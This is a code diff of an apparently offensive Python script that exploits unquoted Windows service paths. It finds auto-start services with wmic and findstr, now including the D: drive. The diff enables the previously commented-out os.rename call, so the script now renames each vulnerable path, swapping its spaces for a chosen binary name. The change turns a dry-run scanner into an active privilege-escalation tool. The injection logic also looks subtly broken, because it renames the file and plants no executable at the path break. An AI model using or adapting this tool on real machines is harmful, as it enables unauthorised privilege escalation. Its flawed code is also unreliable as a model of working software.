@@ -24,24 +24,22 @@ def parseArgs():
 Method that injects binary/binaries into spaces in vulnerable path
 """
 def inject_binary(vuln_files,binary):
-    for key in vuln_files:
-        print('Vulnerable file: ',key)
+    for file in vuln_files:
+        print('Vulnerable file: ',file)
         answer = input('Would you like to inject binary into this file? (y/n)')
         if answer == 'y' or answer == 'Y' or answer == 'yes':
-            marker_list = vuln_files.get(key)
             try:
-                new_path = key.replace(' ',binary) #replace all spaces in file with binary
-                print('new path is: ',new_path)
-                #os.rename(key,new_path)
+                new_path = file.replace(' ',binary) #replace all spaces in file with binary
+                os.rename(file,new_path)
             except:
-                print('Could not inject binary into file: ',key)
+                print('Could not inject binary into file: ',file)
                 continue
 
 """
 Method gets files that are vulnerable and stores them in dict
 @return vuln_files dict mapping file path to list of markers that are where spaces are
 """
-def lookforSpaces():
+def look_for_files():
     #command needed to get vulnerable files
     command = "wmic service get name,displayname,pathname,startmode |findstr /i " \
               + '"Auto"' + " |findstr /i /v " + '"C:\Windows\\\\"' + " |findstr /i /v " + '"""'
@@ -49,14 +47,14 @@ def lookforSpaces():
     responses = output.strip().splitlines()
     response_to_marker = dict()
     file_path_to_marker = dict()
-    vuln_files = dict()
+    vuln_files = set()
     for resp in responses: #iterate through responses
         if len(resp) != 0:
            marker = 0
            for char in resp: #iterate through chars
                try:
-                    if char == 'C' and resp[marker+1] == ':' and resp[marker+2]  == '\\':
-                        #almost everything starts with C:\\
+                    if (char == 'C' or char == 'D') and resp[marker+1] == ':' and resp[marker+2]  == '\\':
+                        #almost everything starts with C:\\ unless on other drive therefore we include D
                         response_to_marker.update({resp:marker})
                         break
                     else:
@@ -77,14 +75,8 @@ def lookforSpaces():
     for key in file_path_to_marker:
         start = file_path_to_marker.get(key)[0]
         end = file_path_to_marker.get(key)[1]
-        marker_list = []
-        file_path = key[start:end] #slice string only caring about start:end as that is file path
-        for i in range(len(file_path)):
-            if file_path[i] == ' ': #appending all spaces in file path
-                marker_list.append(i)
-            elif i == (end-start-1): #if you have reached end of for loop update dict so we only have to update it once
-                 vuln_files.update({file_path:marker_list})
-    return vuln_files #just return set of vuln file paths ditch marker
+        vuln_files.add(key[start:end]) #add vulnerable file path to set
+    return vuln_files
 
 """
 Main method that handles logic
@@ -92,7 +84,7 @@ Main method that handles logic
 def main():
     header()
     binary = parseArgs()
-    vuln_files = lookforSpaces()
+    vuln_files = look_for_files()
     inject_binary(vuln_files,binary)
 
 if __name__ == '__main__':
